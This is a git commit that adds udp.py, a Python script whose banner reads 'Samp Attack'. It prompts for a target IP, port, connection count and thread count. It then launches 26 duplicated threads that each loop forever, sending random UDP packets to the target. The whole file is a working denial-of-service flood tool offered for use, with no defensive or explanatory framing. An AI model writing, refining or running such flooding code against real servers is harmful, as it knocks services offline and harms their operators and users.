7e4b5866030c6e10ff40487e91b7feacda47d268
BimzzxNextGeneration <110216086+BimzzxNextGeneration@users.noreply.github.com>
2022-08-30 17:43:50 +0700

    Add files via upload

---
+++ udp.py
@@ -0,0 +1,356 @@
+import os, sys, time, socket, random, threading
+
+os.system('cls' if os.name == 'nt' else 'clear')
+#######################################
+print(f"""
+Private By Bimzzx.
+Samp Attack.""")
+#######################################
+host = str(input("• IP / HOST : "))
+port = int(input("• PORT : "))
+times = int(input("• CONNECTIONS : "))
+threads = int(input("• THREADING : "))
+#######################################
+ip = socket.gethostbyname(host)
+os.system('cls' if os.name == 'nt' else 'clear')
+#######################################
+
+def run():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run2():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run3():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run4():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run5():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run6():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run7():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run8():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run9():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run10():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run11():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run12():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run13():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run14():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run15():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run16():
+	data = random._urandom(1081)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run17():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run18():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run19():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run20():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run21():
+	data = random._urandom(818)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run22():
+	data = random._urandom(1460)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run23():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run24():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run25():
+	data = random._urandom(818)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+def run26():
+	data = random._urandom(1800)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(" | Extrash With Bimzzx. | ")
+		except:
+			print(" | Server Has Been Maintenace. | ")
+
+for _x in range(threads):
+	threading.Thread(target=run).start()
+	threading.Thread(target=run2).start()
+	threading.Thread(target=run3).start()
+	threading.Thread(target=run4).start()
+	threading.Thread(target=run5).start()
+	threading.Thread(target=run6).start()
+	threading.Thread(target=run7).start()
+	threading.Thread(target=run8).start()
+	threading.Thread(target=run9).start()
+	threading.Thread(target=run10).start()
+	threading.Thread(target=run11).start()
+	threading.Thread(target=run12).start()
+	threading.Thread(target=run13).start()
+	threading.Thread(target=run14).start()
+	threading.Thread(target=run15).start()
+	threading.Thread(target=run16).start()
+	threading.Thread(target=run17).start()
+	threading.Thread(target=run18).start()
+	threading.Thread(target=run19).start()
+	threading.Thread(target=run20).start()
+	threading.Thread(target=run21).start()
+	threading.Thread(target=run22).start()
+	threading.Thread(target=run23).start()
+	threading.Thread(target=run24).start()
+	threading.Thread(target=run25).start()
+	threading.Thread(target=run26).start()
